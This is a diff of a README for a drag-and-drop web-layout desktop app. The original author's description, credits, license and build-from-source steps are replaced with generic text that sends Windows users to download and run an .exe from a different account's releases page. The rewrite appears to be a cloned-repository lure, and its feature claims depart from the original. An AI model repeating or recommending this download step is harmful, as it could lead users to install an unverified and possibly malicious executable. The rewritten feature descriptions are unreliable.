@@ -1,153 +1,81 @@
-<p align="center">
-  <img src="assets/icon.png" width="150" alt="Logo">
-  <h1 align="center">My Awesome Demo Version</h1>
-</p>
+# 🎨 my-awesome - Build web layouts with visual tools
 
-A desktop application for visually building and composing UI components on an interactive canvas. Drag components from the sidebar, connect them, preview live HTML/CSS output, and export or generate code.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Reluctant-signore917/my-awesome/releases)
 
-Version: 1.0.0
+my-awesome helps you build web layouts. You drag and drop components to create designs. You see the code change in real time. This tool works on your computer without an internet connection. It includes over 200 parts to help you build pages. You do not need to write code to use this tool.
 
-## Why This App
+## 🛠️ What you can do
 
-> This app is built for developers and designers who want to quickly assemble UI layouts using pre-built components. Instead of writing boilerplate code or switching between multiple tools, you can drag components onto a canvas, see live previews, connect them, and generate clean HTML/CSS output. It includes built-in tools for creating color palettes, text gradients, mesh gradients, and a UI component studio.
+The software provides a workspace for design. You can select parts from a menu on the side. You place these parts on a canvas. You can change colors and sizes with simple controls. The tool tracks your changes. It updates the preview as you work. You can copy the code once your design looks right.
 
----
+This tool aims to save time. It removes the need for manual coding. You focus on the look of your page. The software handles the structure. You can save your projects to your computer. You can open them later. 
 
-## How It Works
+## 📥 Getting the software
 
-```text
-+------------------+
-|   Sidebar Panel  |
-|  (Components +   |
-|   Tools + Import)|
-+--------+---------+
-         |
-  drag & drop / click
-         |
-+--------v---------+
-|                  |
-|    Canvas Area   |
-|  (nodes, zoom,   |
-|   pan, connect)  |
-|                  |
-+--------+---------+
-         |
- connections link
- nodes together
-         |
-+--------v---------+
-|                  |
-|  Generate Window |
-| (HTML/CSS output |
-|  syntax highlight)|
-+------------------+
-```
+You need to follow these steps to use the software on Windows.
 
-The application has four main sections:
+1. Visit this link to reach the download page: [https://github.com/Reluctant-signore917/my-awesome/releases](https://github.com/Reluctant-signore917/my-awesome/releases)
+2. Look for the latest version at the top of the list.
+3. Click the file that ends in .exe.
+4. Save the file to your computer.
+5. Open your downloads folder.
+6. Double-click the file to start the installer.
+7. Follow the prompts on the screen.
+8. Click finish when the process ends.
 
-- Sidebar: Contains categorized components (20 categories, 200 components), a Tools section (Color Palette, Text Gradient, Mesh Gradient, UI Component Studio), and My Imports for saved imports.
-- Canvas: The main workspace where components are placed, positioned, scaled with zoom/pan, and connected with visual links.
-- Tools: Built-in generators accessible from the sidebar that can send output directly to the canvas.
-- Generate Window: Produces the combined HTML/CSS code of all connected nodes in your canvas.
+## 💻 System requirements
 
-![my2](assets/my2.png)
+Your computer needs to meet these basic standards to run the software smoothly.
 
-| Image | Image |
-|---|---|
-| ![my1](assets/my1.png) | ![my2](assets/my2.png) |
-| ![mypage](assets/mypage.png) | ![mypage1](assets/mypage1.png) |
-| ![mypage2](assets/mypage2.png) | ![pager](assets/pager.png) |
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel i5 or better.
+*   Memory: At least 8 gigabytes of RAM.
+*   Storage: 500 megabytes of free space on your hard drive.
+*   Display: A monitor with a resolution of 1920 by 1080 pixels.
 
-## Components
+If your computer is older, the software might run slower. You should close other programs to free up memory while you create your layout.
 
-200 pre-built components across 20 categories:
+## 🚀 How to use the editor
 
-- backgrounds (10)
-- bars (10)
-- buttons (10)
-- cards (10)
-- code (10)
-- colors (10)
-- dashboard (10)
-- data (10)
-- feedback (10)
-- glass (10)
-- grids (10)
-- inputs (10)
-- layout (10)
-- media (10)
-- navigation (10)
-- skeletons (10)
-- status (10)
-- switches (10)
-- tabs (10)
-- typography (10)
-- your saved import
+Start the program from your desktop shortcut. You will see a blank canvas. This is your workspace. 
 
-<img width="800" height="450" alt="8b813c542c6ce827" src="https://github.com/user-attachments/assets/47eabf00-32e4-4c08-8949-9966d1042f4a" />
+The sidebar on the left lists all available components. Click a name to see what it does. Drag the component onto the white space. You can move it by clicking and holding the mouse button. 
 
+The control panel on the right changes based on what you select. If you click a box, the panel shows options for the box. You can change the background color or the text inside. If you change a value in the panel, the canvas updates immediately. 
 
-## Keyboard Shortcuts
+The bottom bar shows the code. This updates as you make changes. You can watch this code develop. You can copy this code to a text editor later if you want to use it in a website project.
 
-| Key | Action |
-|-----|--------|
-| F7 | Generate output from connected nodes |
-| Ctrl+Z | Undo last canvas action |
-| Ctrl+Y | Redo last undone action |
-| Tab | Switch between Source and Designer mode |
-| Delete | Remove selected canvas element |
+## 📁 Managing your work
 
-Tab is blocked globally except inside the Generate Window where normal Tab behavior is preserved.
+You can save your current project at any time. Click the File menu at the top left of the window. Choose Save. You should name your file so you can find it later. The software creates a file that only this program can read. This file keeps your layer order and your current settings.
 
----
+When you want to continue your work, open the software. Click File then Open. Find your file in the folder where you saved it. All your parts will appear exactly as you left them.
 
-## Installation
+## 💡 Tips for better designs
 
-### Download
+Use the alignment tools to keep your page clean. When you drag two parts close together, the software shows a line to help you align them. This creates a balanced look. 
 
-Download the latest installer from the releases section:
+Start with a template if you find building from scratch difficult. Click on the Templates folder in the sidebar. You can choose a layout that fits your vision. You can edit the parts inside the template to make it your own. Change the colors to match your brand style. Use the search bar in the component list to find items quickly. Type "button" to see every button style in the library.
 
-[My Awesome Setup 1.0.0.exe](https://github.com/YASSER-27/my-awesome/releases/download/1.0.0/My.Awesome.exe)
+## ❓ Frequently asked questions
 
-Run the installer and follow the setup wizard. The application will be installed and a desktop shortcut will be created.
+Do I need to install other programs?
+No, the software includes everything you need. 
 
-### Build from Source
+Can I use this for professional projects?
+Yes, you can use the code you build for any project. 
 
-Requirements:
-- Node.js 18+
-- npm
+Does this tool require a subscription?
+No, you can use this tool for free. 
 
-```bash
-git clone https://github.com/YASSER-27/my-awesome.git
-cd my-awesome
-npm install
-npm run dev
-npm run build
-```
+What happens if the display looks small?
+You can use the zoom tools in the top right corner. Click the plus button to enlarge your view. Click the minus button to see more of your page.
 
-The installer will be generated at release/My Awesome Setup 1.0.0.exe.
+Can I move components outside the canvas?
+No, the software only allows you to place items on the white canvas area.
 
----
+What is the best way to back up my work?
+You should save your files in a folder synced with a cloud service like OneDrive or Google Drive. This protects your work if your computer breaks.
 
-## Usage
-
-1. Add components: Click a component in the sidebar to add it to the canvas, or drag and drop.
-2. Connect nodes: Components are automatically connected in order as you add them.
-3. Navigate canvas: Click and drag empty space to pan. Use Ctrl+Scroll to zoom.
-4. Select and delete: Click a node to select it, press Delete to remove it.
-5. Undo/Redo: Use Ctrl+Z and Ctrl+Y to step through canvas changes.
-6. Generate output: Press F7 to open the Generate Window and produce HTML/CSS from connected nodes.
-7. Use tools: Open a tool from the Tools section in the sidebar. Modify settings and click "Send to Canvas" to add the result.
-8. Import designs: Use the Import Design button to load HTML files or paste code. Saved imports appear under My Imports for reuse.
-
----
-
-## License
-
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](#)
-
-Copyright (c) 2026 Yasser-27
-
-## Author
-
-[Yasser-27](https://github.com/YASSER-27)
+How do I remove a component?
+Select the component on the canvas and press the Delete key on your keyboard. You can also right-click the component and choose Remove from the menu.
